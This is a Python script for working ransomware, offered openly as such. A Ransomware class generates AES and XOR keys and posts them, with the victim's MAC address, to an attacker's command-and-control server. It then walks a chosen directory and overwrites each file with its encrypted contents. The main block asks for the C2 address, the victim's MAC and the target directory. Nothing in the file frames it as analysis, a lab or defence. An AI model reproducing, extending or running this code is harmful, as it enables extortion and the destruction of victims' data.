#!/usr/bin/python3
import requests
import binascii
import base64
import urllib
import os
from colored import fg, attr
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random

class Ransomware:
    def __init__(self, c2_ip, victim_mac):
        self.c2_ip = c2_ip
        self.victim_mac_address = victim_mac.encode()

    def encrypt(self, file):
        print("{}[+] Encrypting -> {}{}".format(fg(9), file, attr(0)))
        with open(file, "rb") as fd:
            data = binascii.hexlify(fd.read())

        xored_data = bytes([data[i] ^ self.xor_key[i % len(self.xor_key)] for i in range(len(data))])

        cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
        ciphertext = cipher.encrypt(pad(xored_data, AES.block_size))

        with open(file, "wb") as fd:
            fd.write(ciphertext)

    def generate_keys(self):
        print("{}[*] Generating encryption keys...{}".format(fg(10), attr(0)))
        self.xor_key = binascii.hexlify(Random.new().read(AES.block_size - 8))
        self.enc_key = Random.new().read(32)
        self.iv = Random.new().read(AES.block_size)
        self.save_keys()

    def save_keys(self):
        print("{}[*] Sending encryption keys to C2 server...{}".format(fg(10), attr(0)))
        c2_url = f"http://{self.c2_ip}:5000/save_keys"
        data = {
            "mac_address": self.encode_keys(self.victim_mac_address),
            "enc_key": self.encode_keys(self.enc_key),
            "xor_key": self.encode_keys(self.xor_key),
            "iv": self.encode_keys(self.iv),
        }
        requests.post(c2_url, data=data)

    def dir_to_encrypt(self, dir_name):
        self.generate_keys()
        print("{}[*] Encrypting '{}' directory{}".format(fg(10), dir_name, attr(0)))
        for root, _, files in os.walk(dir_name):
            for file in files:
                self.encrypt(os.path.join(root, file))

    def encode_keys(self, key):
        return urllib.parse.quote(base64.b64encode(key))

if __name__ == "__main__":
    c2_ip = input("Enter the C2 server IP address: ")
    victim_mac = input("Enter the victim's MAC address: ")
    target_directory = input("Enter the directory to encrypt: ")

    ransom = Ransomware(c2_ip, victim_mac)
    ransom.dir_to_encrypt(target_directory)
